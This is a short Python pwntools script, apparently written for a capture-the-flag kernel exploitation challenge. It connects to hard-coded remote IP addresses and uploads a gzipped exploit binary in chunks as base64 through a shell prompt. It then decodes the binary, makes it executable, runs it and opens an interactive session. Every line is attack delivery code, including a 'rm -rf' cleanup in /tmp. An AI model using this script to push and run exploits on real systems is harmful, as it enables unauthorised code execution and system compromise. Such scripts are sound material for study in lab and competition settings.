from base64 import b64encode
from os import popen
from pwn import *

# popen("gcc exp.c -masm=intel -static -o initramfs/exploit")
# popen("strip -S initramfs/exploit")
b64payload = popen("base64 < ./exploit.gz").read()
b64payload = b64payload.split("\n")
total = len(b64payload)
pause()
# io = remote("206.189.23.108",31429)

io = remote("1.95.84.204", 3212)

io.sendlineafter(
    b"$ ", b"rm -rf /tmp/b64payload ; touch /tmp/b64payload ; cd /tmp")
i = 0
for line in b64payload:
    assert ("\n" not in line)
    io.sendlineafter(b"$ ", f"echo \"{line}\" >> /tmp/b64payload".encode())

    print(f"Upload: {(i+1)/total*100}%")
    i += 1

io.sendlineafter(b"$ ", b"base64 -d < /tmp/b64payload > /tmp/exp.gz")


io.sendlineafter(b"$ ", b"gunzip exp.gz ; chmod +x exp ; ./exp")

io.recvuntil(b"hehe")

sleep(2)

io.interactive()
